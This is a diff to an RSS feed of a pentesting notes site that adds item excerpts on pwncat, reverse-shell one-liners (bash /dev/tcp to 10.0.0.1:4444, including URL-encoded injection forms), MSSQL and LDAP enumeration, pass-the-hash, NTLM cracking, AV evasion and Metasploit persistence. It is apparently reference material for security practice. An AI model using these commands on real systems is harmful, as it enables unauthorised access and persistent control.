@@ -6,8 +6,15 @@
     <description>Recent content in Windows on D0CUM3NTN4T10N</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en</language>
-    <lastBuildDate>Thu, 14 Dec 2023 00:00:00 +0000</lastBuildDate>
+    <lastBuildDate>Sat, 23 Dec 2023 00:00:00 +0000</lastBuildDate>
     <atom:link href="https://documentnation.github.io/tags/windows/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Reverse Shell with Pwncat</title>
+      <link>https://documentnation.github.io/docs/hdks/shell/reverse-shell-with-pwncat/</link>
+      <pubDate>Sat, 23 Dec 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/shell/reverse-shell-with-pwncat/</guid>
+      <description>It can be downloaded from here.&#xA;For listening from remote connection, run the following command.&#xA;pwncat-cs -lp 4444 # For Windows target pwncat-cs -m windows -lp 4444 Commands linkAfter reverse connecting, we can execute commands either local or remote.&#xA;# Switch between Local and Remote shell Ctrl&amp;#43;D # Upload a file to target machine (e.g. upload example.txt from local to remote) (local) upload ./example.txt /tmp/example.txt </description>
+    </item>
     <item>
       <title>AS-REP Roasting</title>
       <link>https://documentnation.github.io/docs/hdks/windows/active-directory/as-rep-roasting/</link>
@@ -28,6 +35,20 @@
       <pubDate>Thu, 14 Dec 2023 00:00:00 +0000</pubDate>
       <guid>https://documentnation.github.io/docs/hdks/windows/active-directory/ldap-pentesting/</guid>
       <description>Enumeration link # Nmap nmap --script ldap-brute --script-args ldap.base=&amp;#39;&amp;#34;cn=users,dc=cqure,dc=net&amp;#34;&amp;#39; -p 389 &amp;lt;target-ip&amp;gt; nmap --script ldap-search -p 389 &amp;lt;target-ip&amp;gt; nmap --script ldap-* -p 389 &amp;lt;target-ip&amp;gt; nmap --script &amp;#34;ldap* and not brute&amp;#34; -p 389 &amp;lt;target-ip&amp;gt; # NetExec # -k: Use Kerberos authentication netexec ldap &amp;lt;target-ip&amp;gt; -u usernames.txt -p &amp;#39;&amp;#39; -k # --trusted-for-delegation: Enumerate computers and users with the flag `TRUSTED_FOR_DELEGATION` # reference: https://learn.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties#property-flag-descriptions netexec ldap &amp;lt;target-ip&amp;gt; -u username -p password --trusted-for-delegation Search LDAP linkBelows are defined in LDAP.</description>
+    </item>
+    <item>
+      <title>MSSQL (Microsoft SQL) Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/database/mssql-pentesting/</link>
+      <pubDate>Thu, 14 Dec 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/database/mssql-pentesting/</guid>
+      <description>Enumeration link nmap --script ms-sql-info -p 1433 &amp;lt;target-ip&amp;gt; nmap --script ms-sql-config -p 1433 &amp;lt;target-ip&amp;gt; nmap --script ms-sql-empty-password,ms-sql-xp-cmdshell -p 1433 &amp;lt;target-ip&amp;gt; nmap --script ms-sql-* -p 1433 &amp;lt;target-ip&amp;gt; # MSDAT: https://github.com/quentinhardy/msdat # all: Enumerate with all modules python3 msdat.py all -s example.com # -D, -U, -P: Use Windows authentication python3 msdat.py all -s example.com -D domain -U username -P password # xpdirectory: List directories in system python3 msdat.py xpdirectory -s manager.htb -D manager -U operator -P operator -d master --list-files &amp;#39;C:\&amp;#39; # bulkopen: Read/download files python3 msdat.</description>
+    </item>
+    <item>
+      <title>Reverse Shell Cheat Sheet</title>
+      <link>https://documentnation.github.io/docs/hdks/shell/reverse-shell-cheat-sheet/</link>
+      <pubDate>Thu, 14 Dec 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/shell/reverse-shell-cheat-sheet/</guid>
+      <description>Setup Listener linkFirst of all, we need to start a listener in local machine to get an incoming connection.&#xA;nc -lvnp 4444 # For more elegant shell, use `rlwrap`. # https://github.com/hanslub42/rlwrap rlwrap nc -lvnp 4444 Online Generator link Reverse Shell Generator Bash link bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4444 0&amp;gt;&amp;amp;1 bash -c &amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4444 0&amp;gt;&amp;amp;1&amp;#39; /bin/bash -c &amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4444 0&amp;gt;&amp;amp;1&amp;#39; # For URL param /?q=bash&amp;#43;-i&amp;#43;&amp;gt;%26&amp;#43;/dev/tcp/10.0.0.1/4444&amp;#43;0&amp;gt;%261 /?q=`bash&amp;#43;-c&amp;#43;&amp;#39;bash&amp;#43;-i&amp;#43;&amp;gt;%26&amp;#43;/dev/tcp/10.0.0.1/4444&amp;#43;0&amp;gt;%261&amp;#39;` with Base64 linkExecute the following commands in target machine.</description>
     </item>
     <item>
       <title>Shadow Credentials</title>
@@ -77,6 +98,20 @@
       <pubDate>Sat, 11 Nov 2023 00:00:00 +0000</pubDate>
       <guid>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/login-windows-shell/</guid>
       <description>Impacket PsExec linkPsExec gives us an interactive shell on the Windows host.&#xA;impacket-psexec username:password@&amp;lt;target-ip&amp;gt; # Pass the Hashes impacket-psexec -hashes abcdef0123456789abcdef0123456789:c2597747aa5e43022a3a3049a3c3b09d username@10.0.0.1 Impacket WmiExec linkWmiExec uses Windows Management Instrumentation (WMI) to give us an interactive shell on the Windows host.&#xA;impacket-wmiexec example.local/username@10.0.0.1 # Pass the Hashes impacket-wmiexec -hashes abcdef0123456789abcdef0123456789:c2597747aa5e43022a3a3049a3c3b09d example.local/username@10.0.0.1 </description>
+    </item>
+    <item>
+      <title>NTLM, NTLMv2</title>
+      <link>https://documentnation.github.io/docs/hdks/cryptography/algorithm/ntlm-ntlmv2/</link>
+      <pubDate>Sat, 11 Nov 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/cryptography/algorithm/ntlm-ntlmv2/</guid>
+      <description>Hash Formats linkThe NTLM hash format is a bit comfused, but it looks like the following.&#xA;When cracking, we can copy them as they are and paste it.&#xA;# NTLM b4b9b02e6f09a9bd760f388b67351e2b # NTLMv2 (NetNTLMv2) admin::EXAMPLE:aaaaaaaaaaaaaaaa:05e616169cf91bd88952bc3ef021dbaf:010100000000000080fc3d82a538d90182f1dba634ba98dd000000000100100053006b005400410052006e00520064000300100053006b005400410052006e0052006400020010006700480068007500670042006200470004001000670048006800750067004200620047000700080080fc3d82a538d901060004000200000008003000300000000000000000000000003000007c8dad06f879f804f9ee43a11aeaf5bf40609db4020697af76cd06f80d81241b0a0010000000000000000000000000000000000009001a0063006900660073002f00310030002e0032002e0034002e0033000000000000000000 Decrypt linkThere are online cracking tools sucy as CrackStation available.&#xA;Using John TheRipper, it might work without specyfing the hash format by detecting automatically, so try the following command.&#xA;john --wordlist=wordlist.txt hash.txt NTLM link john --format=nt --wordlist=wordlist.</description>
+    </item>
+    <item>
+      <title>PE (Portable Executable) Analysis</title>
+      <link>https://documentnation.github.io/docs/hdks/reverse-engineering/pe-analysis/</link>
+      <pubDate>Sat, 11 Nov 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/reverse-engineering/pe-analysis/</guid>
+      <description>Investigation link file example.exe strings example.exe PE Headers linkThere are many tools to analyze PE headers, such as wxHexEditor, pe-tree.&#xA;pe-tree is a tool that views PE files in a tree-view. It will take about a few minutes to open.&#xA;pe-tree ./executable Structure Description IMAGE_DOS_HEADER It consists of the first 64 bytes of the PE file. The first two bytes (”4D 5A”) means the “MZ” characters which are an identity of the Portable Executable format.</description>
     </item>
     <item>
       <title>Windows PrivEsc with AD CS</title>
@@ -184,11 +219,25 @@
       <description>Deobfuscating Log Files linkTo read OneDrive logs, we need to deobfuscate log files (.odl, .odlsent, .odlgz).&#xA;These logs are located in the following on Windows:&#xA;C:\Users\&amp;lt;username&amp;gt;\AppData\Local\Microsoft\OneDrive\logs\Personal\ C:\Users\&amp;lt;username&amp;gt;\AppData\Local\Microsoft\OneDrive\logs\Business1\ This repository is useful to deobfuscate OneDrive logs.&#xA;python -m venv venv # on Windows .\venv\Scripts\activate pip install construct pycryptodome python odl.py -o .\output.csv c:\Users\\AppData\Local\Microsoft\OneDrive\logs\Personal\ After that, we can read the output file (output.csv) with tools such as VS Code and Excel.&#xA;This file contains sensitive information such as OneDrive account email, access token, etc.</description>
     </item>
     <item>
+      <title>Malware Detection on Windows</title>
+      <link>https://documentnation.github.io/docs/hdks/malware/malware-detection-on-windows/</link>
+      <pubDate>Sun, 06 Aug 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/malware/malware-detection-on-windows/</guid>
+      <description>Checking Established Network linkThis process refers to this article. Please see it for more details.&#xA;1. List Network Processes linkWhat first we need to check is to see the network status on Command Prompt.&#xA;# -a: Show all connections # -n: Show ip addresses and ports as number # -o: Show process ID netstat -ano Especially, &amp;ldquo;ESTABLISHED&amp;rdquo; status might be suspicious to be connected attackers server. So we need to investigate the IP address which is connected with our machine.</description>
+    </item>
+    <item>
       <title>Windows Print Spooler Service</title>
       <link>https://documentnation.github.io/docs/hdks/windows/service/windows-print-spooler-service/</link>
       <pubDate>Thu, 03 Aug 2023 00:00:00 +0000</pubDate>
       <guid>https://documentnation.github.io/docs/hdks/windows/service/windows-print-spooler-service/</guid>
       <description>Investigation link # Check if the Print Spooler service is running Get-Service -Name Spooler Detection linkServices link Open Services. We can find the Print Spooler on the Right Pane. Double-click on it and see the details. Malicious DLL Location link C:\Windows\System32\spool\drivers\x64\3\ Event Viewer linkOpen Event Viewer, and find event logs in the following directory in the left pane.&#xA;If you want to filter by Event ID, use &amp;ldquo;Filter Current Log&amp;rdquo; in the right pane.</description>
+    </item>
+    <item>
+      <title>AV (Antivirus) Evasion</title>
+      <link>https://documentnation.github.io/docs/hdks/malware/antivirus-evasion/</link>
+      <pubDate>Wed, 19 Jul 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/malware/antivirus-evasion/</guid>
+      <description>Online Scanner linkWe can check if our payload is detected by antivirus.&#xA;AntiScan </description>
     </item>
     <item>
       <title>WSL Pentesting</title>
@@ -266,6 +315,13 @@
       <pubDate>Wed, 08 Feb 2023 00:00:00 +0000</pubDate>
       <guid>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/windows-privesc-with-unquoted-service-path/</guid>
       <description>Investigation linkIn target machine, find unquoted service path.&#xA;wmic service get name,displayname,pathname,startmode | findstr /i &amp;#34;Auto&amp;#34; | findstr /i /v &amp;#34;C:\\Windows\\&amp;#34; | findstr /i /v &amp;#34;&amp;#34;&amp;#34; &amp;#34; Also query the configuration information for a service.&#xA;sc qc &amp;#34;Development Service&amp;#34; For instance if the service path is &amp;ldquo;C:\Program Files\Development Files\Devservice Files\Service.exe&amp;rdquo;, we can place the exploit to &amp;ldquo;C:\Program Files\Devservice.exe&amp;rdquo; by ignoring paths after a space.&#xA;Exploitation link1. Create a Payload linkIn local machine, create a payload using msvenom.</description>
+    </item>
+    <item>
+      <title>Metasploit Cheat Sheets</title>
+      <link>https://documentnation.github.io/docs/hdks/tool/metasploit-cheat-sheets/</link>
+      <pubDate>Sat, 07 Jan 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/tool/metasploit-cheat-sheets/</guid>
+      <description>Msfconsole linkNo content yet.&#xA;Meterpreter link # List all sessions running on background msf&amp;gt; sessions # Start interacting with the session msf&amp;gt; sessions &amp;lt;session-id&amp;gt; # Drop into a system command shell meterpreter&amp;gt; shell # Upgrade to full functional shell python3 -c &amp;#39;import pty;pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; # Persistence at the target system # -h: Help meterpreter&amp;gt; run persistence -h # -U: Automatically start when the user logs on # -i: The interal in seconds between each connection attempt # -p: The port on which the system running Metesploit is listening # -r: The IP of the system running Metasploit listening for the connect back meterpreter&amp;gt; run persistence -U -i 5 -p 443 -r &amp;lt;local-ip&amp;gt; Msfvenom linkNo content yet.</description>
     </item>
     <item>
       <title>RDP (Remote Desktop Protocol) Pentesting</title>
